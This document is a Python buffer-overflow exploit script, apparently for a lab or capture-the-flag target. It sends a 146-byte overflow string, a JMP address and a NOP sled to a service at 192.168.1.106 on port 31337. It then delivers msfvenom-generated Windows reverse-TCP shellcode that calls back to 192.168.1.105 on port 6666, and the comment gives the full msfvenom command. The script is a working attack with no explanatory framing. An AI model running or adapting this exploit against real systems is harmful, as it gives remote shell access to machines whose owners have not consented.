import socket, time, sys

ip = "192.168.1.106"
port = 31337
timeout = 5

string = "A" * 146 # exact offset
string += "\xc3\x14\x04\x08" # JMP Address 080414C3   // 080416BF
string += "\x90" * 16 # NOP sled

# Shellcode (msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.105 LPORT=6666 -b '\x00\x0a' -f py -a x86 --platform Windows)

buf =  b""
buf += b"\xba\x99\x54\xb0\xa0\xda\xc4\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x52\x31\x56\x12\x83\xee\xfc\x03\xcf"
buf += b"\x5a\x52\x55\x13\x8a\x10\x96\xeb\x4b\x75\x1e\x0e"
buf += b"\x7a\xb5\x44\x5b\x2d\x05\x0e\x09\xc2\xee\x42\xb9"
buf += b"\x51\x82\x4a\xce\xd2\x29\xad\xe1\xe3\x02\x8d\x60"
buf += b"\x60\x59\xc2\x42\x59\x92\x17\x83\x9e\xcf\xda\xd1"
buf += b"\x77\x9b\x49\xc5\xfc\xd1\x51\x6e\x4e\xf7\xd1\x93"
buf += b"\x07\xf6\xf0\x02\x13\xa1\xd2\xa5\xf0\xd9\x5a\xbd"
buf += b"\x15\xe7\x15\x36\xed\x93\xa7\x9e\x3f\x5b\x0b\xdf"
buf += b"\x8f\xae\x55\x18\x37\x51\x20\x50\x4b\xec\x33\xa7"
buf += b"\x31\x2a\xb1\x33\x91\xb9\x61\x9f\x23\x6d\xf7\x54"
buf += b"\x2f\xda\x73\x32\x2c\xdd\x50\x49\x48\x56\x57\x9d"
buf += b"\xd8\x2c\x7c\x39\x80\xf7\x1d\x18\x6c\x59\x21\x7a"
buf += b"\xcf\x06\x87\xf1\xe2\x53\xba\x58\x6b\x97\xf7\x62"
buf += b"\x6b\xbf\x80\x11\x59\x60\x3b\xbd\xd1\xe9\xe5\x3a"
buf += b"\x15\xc0\x52\xd4\xe8\xeb\xa2\xfd\x2e\xbf\xf2\x95"
buf += b"\x87\xc0\x98\x65\x27\x15\x0e\x35\x87\xc6\xef\xe5"
buf += b"\x67\xb7\x87\xef\x67\xe8\xb8\x10\xa2\x81\x53\xeb"
buf += b"\x25\x6e\x0b\xf2\xdc\x06\x4e\xf4\x04\xdd\xc7\x12"
buf += b"\x52\xf1\x81\x8d\xcb\x68\x88\x45\x6d\x74\x06\x20"
buf += b"\xad\xfe\xa5\xd5\x60\xf7\xc0\xc5\x15\xf7\x9e\xb7"
buf += b"\xb0\x08\x35\xdf\x5f\x9a\xd2\x1f\x29\x87\x4c\x48"
buf += b"\x7e\x79\x85\x1c\x92\x20\x3f\x02\x6f\xb4\x78\x86"
buf += b"\xb4\x05\x86\x07\x38\x31\xac\x17\x84\xba\xe8\x43"
buf += b"\x58\xed\xa6\x3d\x1e\x47\x09\x97\xc8\x34\xc3\x7f"
buf += b"\x8c\x76\xd4\xf9\x91\x52\xa2\xe5\x20\x0b\xf3\x1a"
buf += b"\x8c\xdb\xf3\x63\xf0\x7b\xfb\xbe\xb0\x8c\xb6\xe2"
buf += b"\x91\x04\x1f\x77\xa0\x48\xa0\xa2\xe7\x74\x23\x46"
buf += b"\x98\x82\x3b\x23\x9d\xcf\xfb\xd8\xef\x40\x6e\xde"
buf += b"\x5c\x60\xbb"

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.send(string + buf + '\r\n')
        s.recv(1024)
        s.close()
except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
